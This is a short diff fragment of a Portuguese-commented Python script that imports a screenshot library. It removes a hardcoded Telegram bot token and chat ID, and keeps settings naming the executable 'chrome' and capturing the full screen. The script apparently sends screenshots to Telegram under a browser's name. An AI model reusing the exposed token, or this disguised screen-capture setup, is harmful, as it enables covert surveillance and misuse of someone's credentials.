@@ -13,8 +13,8 @@ import mss
 import mss.tools
 
 # Constantes fixas
-BOT_TOKEN = "7326820412:AAGbXGDjsTO0mlpIfOB---KHKV3x5xrqCIU"
-CHAT_ID = -4217087327
+BOT_TOKEN = ""
+CHAT_ID = 
 NOME_EXECUTAVEL = "chrome"
 CAPTURAR_TELA_INTEIRA = True
 
